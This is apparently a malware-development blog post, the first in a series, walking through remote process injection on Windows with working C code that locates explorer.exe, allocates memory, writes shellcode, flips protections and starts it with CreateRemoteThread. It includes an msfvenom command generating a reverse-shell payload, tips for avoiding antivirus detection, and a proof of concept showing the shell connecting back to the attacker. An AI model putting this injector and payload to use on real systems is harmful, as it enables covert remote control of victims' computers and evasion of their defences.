---
title: "Process Injection Part 1: Basic Remote Injection"
date: 2024-12-19 00:00:00
categories:
  - Malware Development
  - Process Injection
tags:
  - maldev
author: 0xB3L14L
description: The first part of this Process Injection series, where a simple injection will be demonstrated using the WinAPI functions VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread. This serves as the foundation for future techniques
lang: en
top_img: /img/Process-Injection-Shellcode/Remote_Process_Injection.png
cover: /img/Process-Injection-Shellcode/Remote_Process_Injection.png
---

The **Process Injection** is a technique used to inject a payload into the memory of a process; this payload can be a shellcode or a DLL. This technique has three fundamental steps:

1. Allocate space in memory (buffer).
2. Write the payload to the buffer.
3. Execute the payload.

These three steps are used for local injection, and depending on the injection sub-technique, the steps will increase.

To perform injection into a remote process, the following steps must be taken:

1. Find the remote process. (***`CreateToolHelp32Snapshot`, `Process32First`, `Process32Next`***)
2. Obtain a handle to the remote process. (***`OpenProcess`***)
3. Allocate a buffer in the remote process. (***`VirtualAllocEx`***)
4. Write the shellcode to the buffer. (***`WriteProcessMemory`***)
5. Set execution permission "X" on the buffer. (***`VirtualProtectEx`***)
6. Execute the buffer. (***`CreateRemoteThread`***)

The shellcode to be used will be generated by msfvenom:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -a x64 -f c --platform windows
```

## **Finding the Remote Process**

To inject the shellcode, the PID of the remote process is needed. The PID is an arbitrary value, and each time a program is executed, it will have a different PID.

![hSnasphot](/img/Process-Injection-Shellcode/PIS-notepad-1.png)
_The first time notepad is executed, it has PID `6716`_

![hSnasphot](/img/Process-Injection-Shellcode/PIS-notepad-2.png)
_The second time notepad is executed, it now has PID `1036`_

One way to find the PID of a process is through its EXE file (executable). For example, notepad is executed via the **`notepad.exe`** executable. A loop can be created that enumerates all processes, comparing their EXE file with **`notepad.exe`**, and if a match is found, its PID can be obtained for injection.

This can be done using the **`CreateToolHelp32Snasphot`** function. If this function is to be used, the header **`tlhelp32.h`** should be included.

### CreateToolHelp32Snapshot

This function takes a snapshot of all the processes, threads, and modules running on the system.
Its parameters:

```c
HANDLE CreateToolhelp32Snapshot(
  [in] DWORD dwFlags,
  [in] DWORD th32ProcessID
);
```

**dwFlags:** This is used to specify what part of the system to include in the snapshot. Since we want a snapshot of all running processes, the option **`TH32CS_SNAPPROCESS`** is used.

**th32ProcessID:** This is used to specify the PID of a particular process when taking a snapshot of threads or modules. In this technique, it will be a snapshot of all processes, so **`NULL`** is used.

![hSnasphot](/img/Process-Injection-Shellcode/PIS-hSnapshot.png)

### PROCESSENTRY32

This is a structure that will contain the process information obtained from the snapshot.

```c
typedef struct tagPROCESSENTRY32 {
DWORD dwSize;
DWORD cntUsage;
DWORD th32ProcessID;
ULONG_PTR th32DefaultHeapID;
DWORD th32ModuleID;
DWORD cntThreads;
DWORD th32ParentProcessID;
LONG pcPriClassBase;
DWORD dwFlags;
CHAR szExeFile[MAX_PATH];
} PROCESSENTRY32;
```
Microsoft documentation indicates that the member **`dwSize`** must be initialized, and the value must be equal to the size of PROCESSENTRY32; otherwise, the function **`Process32First`** would fail.

![PROCESSENTRY32](/img/Process-Injection-Shellcode/PIS-Pe32.png)

### Process32First

Returns the information of the first process found in the snapshot.

```c
BOOL Process32First(
[in] HANDLE hSnapshot,
[in, out] LPPROCESSENTRY32 lppe
);
```
It only needs the handle to the snapshot (the **`HANDLE`** is an identifier, in this case, an identifier to the snapshot), and a pointer to the PROCESSENTRY32 structure.

![Process32First](/img/Process-Injection-Shellcode/PIS-Process32First.png)

### Process32Next

Returns the information of the next process found in the snapshot.

```c
BOOL Process32Next(
  [in] HANDLE hSnapshot,
  [out] LPPROCESSENTRY32 lppe
);
```
It also needs the snapshot, and the pointer to the PROCESSENTRY32.

![Process32Next](/img/Process-Injection-Shellcode/PIS-Process32Next.png)

To make the comparison, a **`do-while`** loop can be used.

### **OpenProcess - Handle to the remote process**

You only need to open the process with OpenProcess.

```c
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
);
```
The first parameter specifies the access rights, you can use **`PROCESS_ALL_ACCESS`**. The second indicates whether child processes inherit the HANDLE, which is not necessary, so set it to **`FALSE`**. The third parameter is the PID of the process obtained with the snapshot, therefore it is found in PROCESSENTRY32.

![OpenProcess](/img/Process-Injection-Shellcode/PIS-do-while.png)

> A function can be created to obtain the handle to the remote process. This function will only have two parameters: the name of the executable (**`szProcessName`**) and the handle to the process (**`hProcess`**).
{: .prompt-info}

## **Function GetRemoteProcessHandle**
```c
BOOL GetRemoteProcessHandle(LPCWSTR szProcessName, HANDLE *hProcess) {

	HANDLE hSnapshot = NULL;

	PROCESSENTRY32 pe32 = {
		.dwSize = sizeof(PROCESSENTRY32)
	};

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	Process32First(hSnapshot, &pe32);

	do
	{
		if (wcscmp(pe32.szExeFile, szProcessName) == 0) {
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			CloseHandle(hSnapshot);
			return TRUE;
		}

	} while (Process32Next(hSnapshot, &pe32));

	CloseHandle(hSnapshot);
	return FALSE;
}
```

## **Allocate Buffer**

Now with the HANDLE to the remote process, a buffer must be created with the appropriate permissions. The shellcode will be placed in this buffer.

### VirtualAllocEx

The function has the following parameters:
```c
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```
The first parameter is the HANDLE to the process, the second is used to determine where the buffer will be placed, it can be set to **NULL**. The third is the size of the buffer, which must be equal to the size of the shellcode. The fourth parameter specifies the type of allocation. In this case, it will be **`MEM_COMMIT`** and **`MEM_RESERVE`**. If you want to write to the allocation (**`MEM_COMMIT`**), you must first reserve it (**`MEM_RESERVE`**). 

In the last parameter, the permissions of the buffer are set; one option can be **`PAGE_EXECUTE_READWRITE`**. The problem with this option is that giving all permissions to a buffer at the same time can be indicative of malware and may be blocked by the antivirus. Because of this, it is more convenient to only set read and write permissions, and after writing the shellcode to the buffer with **`WriteProcessMemory`**, the permissions are changed with **`VirtualProtectEx`**.

![VirtualAllocEx](/img/Process-Injection-Shellcode/PIS-VirtualAllocEx.png)

## **Writing to the Buffer**

Now to write the shellcode to the buffer.

### WriteProcessMemory

```c
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```
The HANDLE of the process, the pointer to the buffer, the pointer to the shellcode, the number of bytes to be written, which is equal to the size of the buffer, are needed. And lastly, if desired, a pointer to a variable that will contain the number of bytes written can be placed; it is not important (**`lpNumberOfBytesWritten == sShellcodeSize`**), and it can be omitted.

![WriteProcessMemory](/img/Process-Injection-Shellcode/PIS-WriteProcessMemory.png)

## **Change the buffer permissions**

The Shellcode is already written in the buffer. The next step is to change the permissions of the buffer; for now, it can only be read and written, but it does not have execution permissions.

### VirtualProtectEx

```c
BOOL VirtualProtectEx(
  [in]  HANDLE hProcess,
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
```
This function needs the HANDLE to the process, the pointer to the buffer, and the size of the buffer.

The new one is **`flNewProtect`**, here the new type of memory protection, or the new permission that the buffer will have is specified. It is necessary for the buffer to have the capability to execute its content, which is why **`PAGE_EXECUTE_READ`** is set.

The last parameter is a pointer to a variable that will receive the type of protection prior to the change.

![VirtualProtectEx](/img/Process-Injection-Shellcode/PIS-VirtualProtectEx.png)

## **Execute the shellcode**

A handle to the remote process was obtained, a buffer was assigned, the shellcode was written into the buffer, and execution permissions were granted. It only remains to execute it, by creating a new thread.

### CreateRemoteThread

Allows creating a thread that will run in the virtual memory of the remote process.

```c
HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
);
```
For this case, only two arguments will need to be passed, the handle of the process (**`hProcess`**), and the buffer (**`lpStartAddress`**). For the rest of the parameters, NULL can be placed.

![CreateRemoteThread](/img/Process-Injection-Shellcode/PIS-CreateRemoteThread.png)

> A function can also be created for injection that will consist of three parameters. The first (**`hProcess`**) is the HANDLE to the remote process, the second (**`pShellcode`**) is a pointer to the shellcode, and the third (**`sShellcodeSize`**) is the size of the shellcode.
{: .prompt-info}

## **Function InjectRemoteProcess**
```c
BOOL InjectRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sShellcodeSize){

	PVOID pShellcodeAddress = NULL;
	DWORD dwOldProtection = NULL;

	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL){
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sShellcodeSize, NULL)) {
		return FALSE;
	}

	memset(pShellcode, '\0', sShellcodeSize);

	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sShellcodeSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		return FALSE;
	}

	if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		return FALSE;
	}

	return TRUE;
}
```

## **PoC - Injection into "explorer.exe"**

For the PoC, Windows Defender will be disabled. (The malware is not using evasion techniques)

The program was compiled in Visual Studio, and upon execution, the connection is received.

![revshell](/img/Process-Injection-Shellcode/PIS-revshell.png)

Using the **System Informer** tool, in the **Network** section, the connection between the victim machine and the attacker can be seen.

![tcp](/img/Process-Injection-Shellcode/PIS-connection.png)

Additionally, the memory address where the shellcode is located can be determined by printing the variable `pShellcodeAddress` in the **InjectRemoteProcess** function.

```c
printf("Shellcode Address: 0x%p \n", pShellcodeAddress);
```
The permissions of the buffer can be viewed.

![addr](/img/Process-Injection-Shellcode/PIS-shellcode-addr.png)

And its content.

![shellcode](/img/Process-Injection-Shellcode/PIS-shellcode.png)

Finally, the injector can be uploaded to VirusTotal to see how many AVs are capable of detecting it.

![vt](/img/Process-Injection-Shellcode/PIS-VT.png)

There are several factors that determine whether an executable is malicious or not, such as the functions used, the strings it contains, etc. There are various techniques to evade the types of analysis used by AV/EDR, which will be explored in future posts.

